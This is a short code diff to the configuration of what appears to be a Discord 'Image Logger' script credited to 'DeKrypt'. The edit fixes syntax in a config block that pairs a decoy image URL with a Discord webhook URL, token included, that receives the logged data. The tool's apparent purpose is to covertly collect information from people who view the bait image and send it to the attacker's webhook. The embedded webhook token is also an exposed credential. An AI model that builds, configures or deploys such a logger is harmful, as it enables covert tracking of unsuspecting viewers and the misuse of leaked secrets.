@@ -13,8 +13,9 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1449009632587546654/yum-zobZkZ67m4dZakOzLWEK0AKcnXWZaNPVdyXyiNUr34eiRFpD_cUI1WrbCRw2leWr",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200"                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "imageArgument": True,
+
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
